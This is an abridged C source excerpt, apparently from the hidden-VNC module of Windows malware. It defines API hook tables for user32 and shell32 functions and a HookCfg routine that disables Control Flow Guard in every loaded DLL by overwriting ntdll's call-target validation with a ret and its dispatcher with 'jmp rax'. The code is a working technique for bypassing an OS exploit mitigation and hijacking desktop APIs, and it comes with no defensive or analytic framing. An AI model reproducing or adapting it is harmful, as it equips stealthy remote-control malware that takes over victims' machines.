...
static HOOK_DESCRIPTOR g_WndIatHooks[] = 
{
	...
	DEFINE_U32_IAT_HOOK_OP(SetTaskmanWindow),
	DEFINE_U32_IAT_HOOK_OP(GetTaskmanWindow),
	DEFINE_U32_IAT_HOOK_OP(SetProgmanWindow),
	DEFINE_U32_IAT_HOOK_OP(GetProgmanWindow),
	...
	//shell32
	DEFINE_SHELL32_IAT_HOOK_OP(SHRestricted),
	DEFINE_SHELL32_IAT_HOOK_OP(SHGetSetSettings),
...
static HOOK_DESCRIPTOR g_WndExpHooks[] = {
	...
	DEFINE_U32_EXP_HOOK_OP(SetTaskmanWindow),
	DEFINE_U32_EXP_HOOK_OP(GetTaskmanWindow),
	DEFINE_U32_EXP_HOOK_OP(SetProgmanWindow),
	DEFINE_U32_EXP_HOOK_OP(GetProgmanWindow),
	...
	//shell32
	DEFINE_SHELL32_EXP_HOOK_OP(SHRestricted),
	DEFINE_SHELL32_EXP_HOOK_OP(SHGetSetSettings),
...
BOOL WINAPI my_GetUserObjectInformationA(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded)
{
	BOOL r;
	ENTER_HOOK();
...
BOOL WINAPI my_GetUserObjectInformationW(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded)
{
	BOOL r;
	ENTER_HOOK();
...
typedef struct _IMAGE_LOAD_CONFIG_DIRECTORY_NEW {
	...
	DWORD_PTR   DeCommitFreeBlockThreshold;
	DWORD_PTR   DeCommitTotalFreeThreshold;
	DWORD_PTR	LockPrefixTable;                // VA
	DWORD_PTR	MaximumAllocationSize;
	DWORD_PTR	VirtualMemoryThreshold;
	DWORD		ProcessHeapFlags;
	DWORD_PTR	ProcessAffinityMask;			// note - this and the previous field is for some reason reversed in the 32-bit version 
	WORD		CSDVersion;
	WORD		Reserved1;
	DWORD_PTR	EditList;                       // VA
	DWORD_PTR	SecurityCookie;                 // VA
	DWORD_PTR	SEHandlerTable;                 // VA
	DWORD_PTR	SEHandlerCount;
	DWORD_PTR	GuardCFCheckFunctionPointer;    // VA
	DWORD_PTR	Reserved2;
	DWORD_PTR	GuardCFFunctionTable;           // VA
	DWORD_PTR	GuardCFFunctionCount;
	DWORD		GuardFlags;
} IMAGE_LOAD_CONFIG_DIRECTORY_NEW, *PIMAGE_LOAD_CONFIG_DIRECTORY_NEW;
#pragma pack(pop)

static void HookCfg(HMODULE imagebase)
{
	PIMAGE_DOS_HEADER pmz;
	PIMAGE_NT_HEADERS pnt;
	PIMAGE_LOAD_CONFIG_DIRECTORY_NEW pload;
	DWORD dwOldProt;
	PBYTE GuardCFCheckFunctionPointer = 0, GuardCFDispatchFunctionPointer = 0;

	pmz = (PIMAGE_DOS_HEADER)imagebase;
	pnt = (PIMAGE_NT_HEADERS)((DWORD_PTR)imagebase + pmz->e_lfanew);
	if (pnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress == 0)
		return;

	pload = (PIMAGE_LOAD_CONFIG_DIRECTORY_NEW)((DWORD_PTR)imagebase + pnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress);
	if (pload->Size < sizeof(IMAGE_LOAD_CONFIG_DIRECTORY_NEW))
		return;

	GuardCFCheckFunctionPointer = (PBYTE)*(ULONG_PTR*)pload->GuardCFCheckFunctionPointer; // ntdll!LdrpValidateUserCallTarget

	VirtualProtect(GuardCFCheckFunctionPointer, 1, PAGE_EXECUTE_READWRITE, &dwOldProt);
	GuardCFCheckFunctionPointer[0] = 0xC3;
	VirtualProtect(GuardCFCheckFunctionPointer, 1, dwOldProt, &dwOldProt);
	...
	if (pload->Reserved2)
	{
		...
		GuardCFDispatchFunctionPointer = (PBYTE)*(ULONG_PTR*)pload->Reserved2; // ntdll!LdrpDispatchUserCallTarget

		VirtualProtect(GuardCFDispatchFunctionPointer, 3, PAGE_EXECUTE_READWRITE, &dwOldProt);
		GuardCFDispatchFunctionPointer[0] = 0x48; // jmp rax
		GuardCFDispatchFunctionPointer[1] = 0xff;
		GuardCFDispatchFunctionPointer[2] = 0xe0;
		VirtualProtect(GuardCFDispatchFunctionPointer, 3, dwOldProt, &dwOldProt);
	}
#endif _WIN64

	//DbgPrint("Patched at address %p&%p (size %d, %d)", GuardCFCheckFunctionPointer, GuardCFDispatchFunctionPointer, pload->Size, sizeof(IMAGE_LOAD_CONFIG_DIRECTORY_NEW));
}
...
WINERROR VncHookActivate(VOID)
{
	...
	// patch all dlls to support CFG
	if (Status == NO_ERROR)
	{
		if (SystemMajor > 6 || (SystemMajor == 6 && SystemMinor >= 3)) // win 8.1
		{
			...
			{
				for (ULONG i = 0; i < ModCount; i++)
				{
					//WCHAR FileName[MAX_PATH];
					//GetModuleFileNameW(ModArray[i], FileName, MAX_PATH);
					//DbgPrint("Patch CFG for %S", FileName);
					HookCfg(ModArray[i]);
				}
